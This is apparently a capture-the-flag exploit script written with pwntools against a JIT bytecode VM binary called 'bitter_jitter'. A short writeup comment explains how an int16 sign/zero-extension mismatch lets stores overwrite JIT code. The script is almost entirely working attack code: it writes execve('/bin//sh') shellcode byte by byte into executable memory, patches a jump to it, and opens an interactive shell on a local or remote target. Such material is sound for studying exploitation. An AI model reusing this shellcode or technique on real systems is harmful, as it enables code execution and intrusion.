#!/usr/bin/env python3
import struct
from pwn import *

MOV = 4
STORE_OFF = 8
CALL = 9
RET = 10
NOP = 11
END = 12

R1 = 1
DP = 4

FUNC = 0x100
OFF = 0x3000

"""
writeup:
    store and load in run_vm differs: interpreter casts the idx as int16_t with sign, jit treats it at signed but then 0extends the value.

    in init_vm:
vm_0.maps.jitcode = (uint8_t *)(mapping + 0x10000);// bug: since i can do 0xffff + 1 = 0x10000 with the bug in store and load, i could write into the jitcode (@ data + 0x10000 + off)
  mp

  in jit_func:
        vala = fetch16();
        reg = get_vm_reg();
        tmp_dp = vala + dp;
        if ( tmp_dp > *max_dp )
          *max_dp = tmp_dp;
        if ( tmp_dp < *min_dp )
          *min_dp = tmp_dp;

        vala is signed _int16

        then:
            *(_WORD *)jitcode = vala;
            jitcode += 2;
            *jitcode++ = 0;
            *jitcode++ = 0;
        -> zero extension, not sign extension

        if vala = 0xffff ->  0x0000ffff

jitcode write:

    movzx rcx, byte ptr [rax]
    mov byte ptr [rbx + disp32], cl

so i can use the jitcode to write my shellcode overwriting itself, then execute it

call func 6 times
jmp to shellcode
padding
shellcode to call execve
"""




"""
xor rsi, rsi
mov rbx, '/bin//sh'
push rsi
push rbx 
mov rdi, rsp
xor rdx, rdx
mov al, 59
syscall
"""


shellcode = bytes.fromhex(
    "4831f6"
    "48bb2f62696e2f2f7368"
    "56"
    "53"
    "4889e7"
    "4831d2"
    "b03b"
    "0f05"
)

def u16(x):
    return struct.pack("<H", x & 0xffff)

def mov(reg, val):
    return bytes([MOV, reg]) + u16(val)

def store_off(off, reg):
    return bytes([STORE_OFF]) + u16(off) + bytes([reg])

def call(addr):
    return bytes([CALL]) + u16(addr)

patches = []

# build shellcode bytes
for i, b in enumerate(shellcode):
    patches.append((OFF + i, b))

rel = OFF - 5 # offset - length of the jump op
jmp = b"\xe9" + struct.pack("<i", rel) # jmp to shellcode, long 5 bytes

# beginning of jitcode is jmp shellcode
for i in [1, 2, 3, 4, 0]:
    patches.append((i, jmp[i]))

main = call(FUNC) * 6 + bytes([END])
# 5th time: write the shellcode 
# 6th: execute shellcode


code = bytearray(main)
code += bytes([NOP]) * (FUNC - len(code))

body = bytearray() # code executed at the 5th call

# write shellcode one byte at a time
for off, b in patches:
    body += mov(R1, b)
    body += mov(DP, off + 1)
    body += store_off(0xffff, R1)


body += bytes([RET])
code += body

payload = code.hex().encode()

if args.REMOTE:
    io = remote(args.HOST, int(args.PORT))
else:
    io = process("./bitter_jitter")

io.recvuntil(b"Send your bytecode in hex:")
io.sendline(payload)
io.interactive()
